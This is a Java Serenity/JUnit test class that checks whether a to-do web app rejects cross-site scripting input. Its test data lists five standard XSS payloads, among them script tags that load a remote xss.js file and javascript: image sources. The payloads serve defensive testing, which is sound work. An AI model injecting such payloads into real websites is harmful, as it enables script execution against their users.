package todotests;

import common.pageobject.steps.StepsLibrary;
import net.serenitybdd.junit.runners.SerenityParameterizedRunner;
import net.thucydides.core.annotations.Managed;
import net.thucydides.core.annotations.Steps;
import net.thucydides.core.annotations.WithTag;
import net.thucydides.core.annotations.WithTags;
import net.thucydides.junit.annotations.TestData;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.openqa.selenium.WebDriver;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collection;
import java.util.List;

@RunWith(SerenityParameterizedRunner.class)
@WithTags({
        @WithTag("SECURITY")
})
public class SecurityTests {



    // Create test data for XSS attack
    @TestData
    public static Collection<Object[]> testData(){
        return Arrays.asList(new Object[][]{
                {"<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>"},
                {"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"},
                {"<IMG SRC=\"javascript:alert('XSS');\">"},
                {"<SCRIPT/XSS SRC=\"http://xss.rocks/xss.js\"></SCRIPT>"},
                {"<IMG SRC=\"javascript:alert('XSS')\""}
        });
    }


    private final String xssString;

    public SecurityTests(String xssString) {
        this.xssString = xssString;
    }

    @Steps
    StepsLibrary user;

    @Managed
    WebDriver driver;



    @Test

    public void userAttemptsXSSAttack(){
        List<String> items = new ArrayList<>();
        items.add(xssString);
        user.openToDo();
        user.addItem(xssString);
        user.verifyItemsDoNotExist(items);

    }

}

